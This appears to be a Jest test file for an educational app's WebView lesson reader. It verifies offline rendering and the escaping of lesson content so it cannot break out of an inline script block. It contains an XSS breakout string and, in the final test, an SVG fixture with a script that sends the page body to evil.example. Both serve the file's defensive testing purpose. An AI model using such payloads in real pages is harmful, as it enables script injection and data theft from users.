import { buildTopicHtml } from "@/components/contentHtml";
import type { GeneratedTopic } from "@/types/book";

// Two defects in the reader's WebView document, fixed together because they live
// on the same line (`var DATA = ${dataJson}`) and share a root: the document
// assumed things about its content and its network that were not true.
//
//  1. #325 — marked/KaTeX/Mermaid came from cdn.jsdelivr.net with no fallback and
//     RENDER_HELPERS_JS's first statement was `new marked.Renderer()`. Offline
//     that threw before anything rendered and the WebView sat at "Loading…"
//     forever — in a product whose free tier is device-local and offline by
//     design (ADR-028/029).
//  2. GHSA-48wh-p7cx-c87j — JSON.stringify does not escape `</script>`, so content
//     containing it closed the script block and the rest became live DOM in a
//     WebView with javaScriptEnabled + originWhitelist ["*"] and no sanitizer.
//     This product TEACHES: a lesson about web development containing
//     `</script>` in an example is expected content, not an attack.

function topic(over: Record<string, unknown> = {}): GeneratedTopic {
  return {
    topicId: "t1",
    title: "Why Context Engineering Emerged",
    generatedAt: "x",
    lesson: {
      topic: "T", level: "adult", language: "en",
      synopsis: "A short overview.",
      learning_objectives: ["Explain X"],
      sections: [{ heading: "Introduction", body_markdown: "Intro **body** text." }],
      key_takeaways: ["takeaway one"],
      further_reading: [],
    },
    ...over,
  } as unknown as GeneratedTopic;
}

/** The `__html` the WebView will inject, as the WebView itself would read it. */
function embeddedHtml(doc: string): string {
  const m = doc.match(/var DATA = (\{.*?\});\n/s);
  if (!m) throw new Error("no DATA embed found");
  // JSON.parse, deliberately NOT new Function: these payloads contain breakout
  // strings, so evaluating them would run the very thing under test if the escape
  // regressed. It also asserts the stronger property — the output is still valid
  // JSON, not merely valid JS.
  return (JSON.parse(m[1]) as { __html: string }).__html;
}

describe("#325 — the reader renders offline", () => {
  it("ships finished HTML, not a recipe for building it", () => {
    // The fix: markdown is rendered in RN (Hermes) by the shared renderer, so the
    // content is already HTML in the document. That is what "renders offline"
    // means concretely — no CDN global is needed to show text.
    const html = embeddedHtml(buildTopicHtml(topic()));
    expect(html).toContain("<strong>body</strong>"); // marked ran in RN, before the WebView
    expect(html).toContain("<h2>Introduction</h2>"); // the section rendered too
    expect(html).toContain("<h1>T</h1>"); // renderLesson titles from lesson.topic
  });

  it("does not load marked at all — it was the thing that threw offline", () => {
    const doc = buildTopicHtml(topic());
    expect(doc).not.toContain("marked.min.js");
    expect(doc).not.toContain("new marked.Renderer()");
  });

  it("guards KaTeX and Mermaid so their absence cannot blank the page", () => {
    const doc = buildTopicHtml(topic());
    // Still CDN (bundling is ~4.8MB — out of scope for #325), therefore optional.
    // Every use must be behind a typeof check, or offline throws and we are back
    // to "Loading…" forever.
    expect(doc).toMatch(/typeof renderMathInElement === 'function'/);
    expect(doc).toMatch(/typeof mermaid !== 'undefined'/);
    // …and the body is assigned BEFORE either runs, so text survives regardless.
    // (The assignment now goes through DOMPurify.sanitize() first — see the
    // native topic sanitizer hardening — but the ORDERING guarantee this test
    // pins is unchanged: sanitize-then-assign still precedes the KaTeX/Mermaid
    // enhancement blocks.)
    const assignAt = doc.indexOf("root').innerHTML = clean");
    expect(assignAt).toBeGreaterThan(-1);
    expect(assignAt).toBeLessThan(doc.indexOf("renderMathInElement(document.body"));
  });
});

describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block", () => {
  const BREAKOUT = "</script><img src=x onerror=BREAKOUT>";
  /** Everything between the DATA embed and the end of the inline script. */
  function scriptRegion(doc: string): string {
    return doc.slice(doc.indexOf("var DATA"), doc.indexOf("})();"));
  }

  it("a lesson whose prose contains </script> never closes the script block", () => {
    const doc = buildTopicHtml(topic({
      lesson: { ...topic().lesson, synopsis: `Teaching HTML: ${BREAKOUT} is a closing tag.` },
    }));
    expect(scriptRegion(doc)).not.toContain("</script>");
    expect(doc).not.toContain(BREAKOUT);
  });

  it("holds for every field that reaches the embed, not just the synopsis", () => {
    const doc = buildTopicHtml(topic({
      title: `T${BREAKOUT}`,
      lesson: {
        ...topic().lesson,
        sections: [{ heading: `H${BREAKOUT}`, body_markdown: `B${BREAKOUT}` }],
        key_takeaways: [`K${BREAKOUT}`],
      },
    }));
    expect(scriptRegion(doc)).not.toContain("</script>");
    expect(doc).not.toContain(BREAKOUT);
  });

  it("escapes < in the embed even when the HTML itself is legitimate markup", () => {
    // Our own tags must be escaped too — that is what makes the guarantee
    // structural rather than dependent on the renderer escaping content.
    const doc = buildTopicHtml(topic());
    expect(doc).toContain("\\u003ch1>");
    expect(scriptRegion(doc)).not.toContain("<h1>");
  });

  it("escaping does not corrupt the data — it round-trips exactly", () => {
    const doc = buildTopicHtml(topic({
      lesson: { ...topic().lesson, sections: [{ heading: "H", body_markdown: "plain text" }] },
    }));
    expect(embeddedHtml(doc)).toContain("plain text");
    expect(embeddedHtml(doc)).toContain("<h2>H</h2>"); // decodes back to real markup
  });

  it("escapes U+2028/U+2029 — legal in JSON, line terminators in JS", () => {
    const doc = buildTopicHtml(topic({
      lesson: { ...topic().lesson, synopsis: "line break here" },
    }));
    expect(scriptRegion(doc)).not.toContain(" ");
    expect(scriptRegion(doc)).not.toContain(" ");
    expect(embeddedHtml(doc)).toContain("line break here"); // still round-trips
  });
});

// Regression guard for the unification itself. The deleted WebView twin stripped
// <script> from ```svg blocks because native has no sanitizer; the shared
// renderer's comment said "do not pre-strip — the final DOMPurify pass handles
// it", which is true ONLY on web. Unifying them naively would have silently
// dropped native's only protection there.
describe("shared renderer keeps the twin's native-only SVG script strip", () => {
  it("strips <script> from a ```svg block reaching the WebView (no DOMPurify there)", () => {
    const doc = buildTopicHtml(topic({
      lesson: {
        ...topic().lesson,
        sections: [{
          heading: "Anim",
          body_markdown: "```svg\n<svg><script>fetch('https://evil.example/'+document.body.innerHTML)</script><circle/></svg>\n```",
        }],
      },
    }));
    const html = embeddedHtml(doc);
    expect(html).toContain('<figure class="anim-svg">'); // the SVG still renders
    expect(html).toContain("<circle/>"); //           …with its real content
    expect(html).not.toContain("<script>"); //          …minus the script
    expect(html).not.toContain("evil.example");
  });
});
